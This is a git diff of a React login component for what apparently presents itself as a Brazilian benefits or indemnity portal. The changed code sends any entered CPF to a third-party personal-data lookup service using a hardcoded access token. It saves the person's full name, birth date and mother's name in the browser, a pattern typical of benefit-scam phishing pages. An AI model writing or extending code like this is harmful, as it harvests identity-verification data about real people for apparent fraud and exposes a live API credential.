@@ -28,12 +28,18 @@ const Login = () => {
     const cpfLimpo = cpfMascarado.replace(/\D/g, '');
 
     try {
-      const response = await fetch(`https://proxy-a.vercel.app/api/proxy?cpf=${cpfLimpo}`);
+      const response = await fetch(`https://ws.hubdodesenvolvedor.com.br/v2/cadastropf/?cpf=${cpfLimpo}&token=178687270OUgSLGzpdl322614448`);
       const data = await response.json();
 
-      if (data?.dadosBasicos) {
-        localStorage.setItem('usercpf', cpfLimpo);
-        localStorage.setItem('dadosUsuario', JSON.stringify(data.dadosBasicos));
+      // Verifica se o status é true e se tem o resultado esperado
+      if (data?.status === true && data?.result) {
+        const { nomeCompleto, dataDeNascimento, nomeDaMae } = data.result;
+
+        localStorage.setItem('cpf', cpfMascarado); // salva com máscara para o usuário ver igual
+        localStorage.setItem('nomeCompleto', nomeCompleto || '');
+        localStorage.setItem('dataDeNascimento', dataDeNascimento || '');
+        localStorage.setItem('nomeDaMae', nomeDaMae || '');
+
         navigate('/consulta');
       } else {
         setErrorMessage('CPF não encontrado.');
@@ -62,7 +68,9 @@ const Login = () => {
       {/* Caminho */}
       <div className={styles.path}>
         <i className="bi bi-list"></i>
-        <span>Benefício &gt; Indenização &gt; <b>Acessar</b></span>
+        <span>
+          Benefício &gt; Indenização &gt; <b>Acessar</b>
+        </span>
       </div>
 
       {/* Slider */}
@@ -89,7 +97,15 @@ const Login = () => {
           />
           {/* Mensagem de erro */}
           {errorMessage && (
-            <div style={{ color: 'red', fontSize: '12px', marginTop: '5px', marginBottom: '8px', fontWeight: 'bold' }}>
+            <div
+              style={{
+                color: 'red',
+                fontSize: '12px',
+                marginTop: '5px',
+                marginBottom: '8px',
+                fontWeight: 'bold',
+              }}
+            >
               {errorMessage}
             </div>
           )}
